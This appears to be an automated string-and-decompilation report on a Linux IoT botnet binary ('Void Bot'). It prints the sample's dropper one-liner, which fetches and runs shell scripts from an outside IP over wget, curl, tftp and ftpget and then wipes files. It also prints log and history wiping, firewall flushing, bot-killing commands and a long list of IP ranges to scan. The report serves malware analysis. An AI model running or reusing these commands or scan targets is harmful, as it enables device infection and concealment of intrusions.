=============================================================================
========	BINARY ID :636c9e2325856a259e6006d4b899e1d87136c745==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2769
SUPSCPECTED LINES COUNT :217
SUPSCPECTED STRINGS COUNT (DISTINCT) :28
SUPSCPECTED STRINGS WEIGHT :107
SUSPECT STRING SCORE : [107 / 150] 71%
USER AGENTS STRINGS COUNT :62
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :199
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
nopqrstuvwÃŸ
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
/proc/cpuinfo
PING
gethostbyname
\e[0;31mSuccessfully Bruteforced IP: \e[0;33m%s | \e[0;31mUsername: \e[0;33m%s | \e[0;31mPassword: \e[0;33m%s\e[0m
%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
bin*
bot*
busybotnet*
busybotnet
\b/dev/netslink/
/usr/
>%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n
pkill -9 %s\r\n
rm -rf /bin/netstat
pkill -9 busybox
pkill -9 perl
/sbin/iptables -F;/sbin/iptables -X
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
http
\bFailed opening raw socket.
Invalid flag "%s"
GETLOCALIP
BOTKILL
Killing Bots
LOOPING PAYLOAD
TELNET
TELNET ON | OFF
NETIS
[NETIS] SCANNER Starting
HTTP
/proc/net/route
/usr/bin/python
/usr/sbin/dropbear
\e[1;36m Void Bot Connected \e[1;31m| \e[1;37mIP: \e[1;35m%s \e[1;31m| \e[1;37mType: \e[1;35m%s \e[1;31m| \e[1;37mVersion: \e[1;35m%s
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
Unknown host
Host name lookup failure
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/i386/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4203
strstr.c
_string_syserrmsgs.c
error_msg
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
__malloc_largebin_index
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
hostname_to_ip
__GI_srandom_r
Server_Botport
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
ngPid
strstr
init_rand
rand
StartTheNetis
HackerScan2
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
HackerScan
__GI_inet_pton
gethostbyname
__vfork
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
hekkertelnet
__GI_vfork
NetisRanges
__GI_inet_addr
__libc_connect
pids
sigprocmask
^8PShKJ
xAPPSh`[
PPShL
^8PShKJ
^8PShKJ
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
Mozilla/5.0 (PLAYSTATION 3; 3.55)
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
wii libnup/1.0
Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
PSP (PlayStation Portable); 2.00
Bunjalloo/0.7.6(Nintendo DS;U;en)
Doris/1.15 [en] (Symbian)
BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
191.96.249.102
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
history -c
rm -rf ~/.bash_history
history -w
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 74866
+++TOTAL FUNCTIONS 			:261
+++LINES PER FUNCTION RATIO 	: 286.842911877395
+++SUSPECTED LINES COUNT 	: 2168
+++SUSPECTED LINES RATIO 	: 2.89584056848236
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 74866
+++WHILE (TRUE) LINES			: 15208
+++WHILE (TRUE) LINES RATION		:20.3136270135976%
+++WHILE (TRUE) LOOPS COUNT		: 265
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/"
    char (*v60)[703] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n";
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v143, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v143, 0);
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v143, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v143, 0);
    int32_t v142 = __libc_open("/proc/cpuinfo", 0); // 0x8048ea1
    int32_t v142 = __libc_open("/proc/cpuinfo", 0); // 0x804905e
        sprintf(v145, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");
    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"rm -rf /bin/netstat");
                int32_t v148 = __libc_open("/proc/net/route", 0); // 0x8050a60
    int32_t result = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"ROUTER" : (int32_t)"SERVER"; // 0x8050ba9
    char * v135 = "/usr/bin/python"; // bp-5360
    int32_t v136 = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"/usr/sbin/dropbear" : (int32_t)"sshd";
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    if (__libc_open("/dev/null", v144) != v142) {
    int32_t v143 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v142); // 0x805641d
    int32_t v156 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v142); // 0x805643b
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(a1, (char *)a2, 0, -1);
int32_t _stdio_fopen(int32_t a1, char * a2, int32_t a3, int32_t a4) {
    int32_t v142 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v141); // 0x805782d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v141);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",

    char (*v58)[15] = "191.96.249.102";

